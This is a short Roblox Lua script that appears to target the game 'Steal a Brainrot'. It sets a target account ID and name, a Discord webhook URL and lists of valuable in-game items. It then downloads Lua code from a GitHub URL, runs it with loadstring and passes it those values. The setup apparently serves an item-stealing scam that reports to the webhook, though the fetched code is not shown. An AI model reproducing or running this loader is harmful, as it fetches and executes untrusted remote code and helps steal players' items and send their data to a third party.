local TARGET_ID = 11957941756
local TARGET_USER = "iloveduel84"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1560307030869414009/wRQmzUWVzdZaYadsGeOjUqsjOVhwfvDfsaj7J1_fzhHYFh-1pAi9fvIHD9oCYL75tiZK"

local TargetBrainrots = {
    ["Dragon Skeletonini"] = true,
    ["Phoenix"] = true,
    ["Plant Bros"] = true,
    ["Orchidox"] = true,
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Dragon Cannelloni"] = true,
    ["Gold and Diamond"] = true,
    ["La Craft Machine"] = true,
    ["Los Dragons"] = true,
    ["Dragon Gingerini"] = true,
    ["Griffin"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Hydra Bunny"] = true,
    ["Rubrikiko"] = true,
    ["Elefanto Frigo"] = true,
    ["John Pork"] = true,
    ["Antonio"] = true,
    ["Pancake and Syrup"] = true,
    ["Arcadragon"] = true,
    ["Rico Dinero"] = true,
    ["Capitano Americano"] = true,
    ["Dug Dug Dug"] = true,
    ["Globa Steppa"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Kalika Bros"] = true,
    ["Dragon Aquanini"] = true,
    ["Signore Carapace"] = true,
    ["La Casa Boo"] = true,
    ["Fishino Clownino"] = true,
    ["La Supreme Combinasion"] = true,
    ["4th Bros"] = true,
    ["Bufalino Boomberino"] = true,
    ["Headless Horseman"] = true,
    ["Money Money Bros"] = true,
    ["Kraken"] = true,
    ["Cerberus"] = true,
    ["Duggy Bros"] = true,
    ["Venuspino"] = true,
    ["Sammyni Cakini"] = true,
    ["Steakini Fattini"] = true,
    ["Centrucci Nuclucci"] = true,
    ["Los Hackers"] = true,
    ["Caylusaurus"] = true,
    ["John Doe"] = true,
    ["Rhino Helicopterino"] = true,
    ["Ginger Cisterna"] = true,
    ["Los Tictacs"] = true,
    ["Foxini Lanternini"] = true,
    ["Los Tangcitos"] = true,
    ["Jelly Moby"] = true,
    ["Digi Narwhal"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Bearito Cabinito"] = true,
    ["Moby Bros"] = true,
    ["Los Admins"] = true,
    ["Garama and Madundung"] = true,
    ["Hydra Serpent"] = true,
    ["Capitano Moby"] = true
}

local TargetBaseSkins = {
    ["Cursed"] = true,
    ["Aquatic"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Bunny Basket"] = true,
    ["Cyber"] = true,
    ["Diamond"] = true,
    ["Divine"] = true,
    ["Gold"] = true,
    ["Gingerbread"] = true,
    ["Galaxy"] = true,
    ["Easter"] = true,
    ["Halloween"] = true,
    ["Lava"] = true,
    ["Lucky"] = true,
    ["Octo"] = true,
    ["Yin Yang"] = true,
    ["Rose"] = true,
    ["Rainbow"] = true,
    ["Valentines"] = true,
    ["Radioactive"] = true,
    ["Taco"] = true,
    ["Pot of Gold"] = true,
    ["Summer"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    ["Cupid's Wings"] = true,
    ["Alien Slap"] = true
}

task.spawn(function()
    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)